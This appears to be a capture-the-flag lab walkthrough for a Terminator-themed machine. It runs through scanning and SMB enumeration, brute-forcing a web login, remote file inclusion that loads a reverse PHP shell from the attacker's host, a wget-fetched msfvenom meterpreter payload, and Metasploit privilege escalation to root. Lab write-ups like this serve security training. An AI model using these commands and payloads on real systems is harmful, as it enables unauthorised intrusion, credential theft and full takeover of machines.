# Terminator Notes
----
____

# My IP = 10.8.19.163

# Target IP = 10.10.57.109

# NMAP SCAN:

> sudo nmap -f -sC -sV -p- -O -Pn -n -T4 -vv --script vuln 10.10.199.228 | tee skynet.nmap 

> cat skynet.nmap | grep 'open'

	Results:

		Discovered open port 445/tcp on 10.10.199.228
		Discovered open port 143/tcp on 10.10.199.228
		Discovered open port 22/tcp on 10.10.199.228
		Discovered open port 80/tcp on 10.10.199.228
		Discovered open port 110/tcp on 10.10.199.228
		Discovered open port 139/tcp on 10.10.199.228
		22/tcp    open     ssh          syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
		80/tcp    open     http         syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
		|       Slowloris tries to keep many connections to the target web server open and hold
		|       them open as long as possible.  It accomplishes this by opening connections to
		110/tcp   open     pop3         syn-ack ttl 63 Dovecot pop3d
		139/tcp   open     netbios-ssn  syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		143/tcp   open     imap         syn-ack ttl 63 Dovecot imapd
		445/tcp   open     netbios-ssn  syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

	SMB ENUM SHARES NMAP Script:

	> nmap --script smb-enum-shares.nse -p445, 139 10.10.199.228

# smbget. 

	Used smbget to acquire logs anf files from target.

	> smbget -R smb://10.10.57.109/anonymous

	Results:

>	smb://10.10.57.109/anonymous/attention.txt                                                                                                                                                                      
>	smb://10.10.57.109/anonymous/logs/log2.txt                                                                                                                                                                      
>	smb://10.10.57.109/anonymous/logs/log1.txt                                                                                                                                                                      
>	smb://10.10.57.109/anonymous/logs/log3.txt

1. Combined all logs into passwords.txt

# Gobuster

> gobuster dir -u http://10.10.199.228:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee skynetbuster.txt

# Burpsuite Intruder Attack

Loaded http POST request into Burpsuite intruder.

USERNAME: milesdyson PASSWORD: cyborg007haloterminator

1. First email gives a new smb password for milesdyson.

	> )s{A&2Z=F^n_E.B`

2. Used smbget to try and see if it works. DENIED?

>	Password for [root] connecting to //milesdyson/10.10.57.109: 
>	Using workgroup WORKGROUP, user root
>	Can't open directory smb://10.10.57.109/milesdyson: Permission denied

# RETRY

> smbget -U milesdyson -R smb://10.10.57.109/milesdyson
> password for milesdyson: )s{A&2Z=F^n_E.B`

Success!

1. Found a document titled important.txt.

> cat important.txt

> Discovered hidden website path.

Dirbuster on the hidden site revealed a /adminsitrator page. Tried earlier credentials.

> USERNAME: milesdyson PASSWORD: cyborg007haloterminator

No luck trying burpsuite intruder attack again.

Now trying remote file inclusion by placing a link request to the webserver and having it download my reverse php shell.

> http://10.10.132.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.19.163:8000/shell.php

NOw i have a reverse shell via nc -lnvp 6666

---

$ cd home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807

---

Try the same thing but with a meterpreter shell via msfvenom.

> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.163 LPORT=6677 -f elf > shell.elf

Made a shell.elf wwith meterpreter callback

Went to cd /tmp and used a wget request:

> wget http://10.8.19.163/shell.elf

Success!

Running exploit suggester:

> run post/multi/recon/local_exploit_suggester

I have two priv esc options from the suggester:

> [+] 10.10.132.119 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
> [+] 10.10.132.119 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.

Backgrounding meterpreter shell.

Trying "exploit/linux/local/glibc_realpath_priv_esc" first in metasploit.

No luck.

Tried "exploit/linux/local/bpf_sign_extension_priv_esc" next.

Success.

> getuid - 

> cat /root/root.txt - 3f0372db24753accc7179a282cd6a949
